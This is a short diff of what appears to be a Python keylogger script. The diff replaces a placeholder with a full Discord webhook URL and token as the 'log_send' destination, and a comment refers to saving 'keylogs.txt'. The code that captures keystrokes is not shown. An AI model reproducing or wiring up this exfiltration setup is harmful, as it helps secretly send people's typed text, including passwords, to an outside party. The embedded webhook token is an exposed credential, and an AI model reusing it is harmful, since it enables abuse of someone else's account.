@@ -7,7 +7,7 @@ import logging
 log_dir = ""
 
 # URL HERE
-log_send = Webhook('here')
+log_send = Webhook('https://discord.com/api/webhooks/1114517058009452624/6uZwlpcB6NSlLCKim9j5x8Gb2SAIelR8_lo3lEMZZSDkTzXq7aExU-3ewPhT4K8pupWw')
 
 #save the file as keylogs.txt
 
